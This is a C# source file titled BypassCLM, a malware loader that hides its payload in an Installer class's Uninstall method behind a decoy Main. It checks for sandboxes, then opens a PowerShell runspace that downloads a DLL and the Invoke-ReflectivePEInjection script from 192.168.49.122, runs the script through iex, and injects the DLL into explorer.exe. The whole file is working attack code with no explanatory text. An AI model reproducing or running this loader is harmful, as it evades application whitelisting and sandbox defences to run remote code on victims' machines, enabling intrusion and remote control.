using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.Runtime.InteropServices;

namespace BypassCLM
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy.");
        }
    }


    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
   uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.122/out/dll/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.122/tools/ps1/Invoke-ReflectivePEInjection.ps1') | iex; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}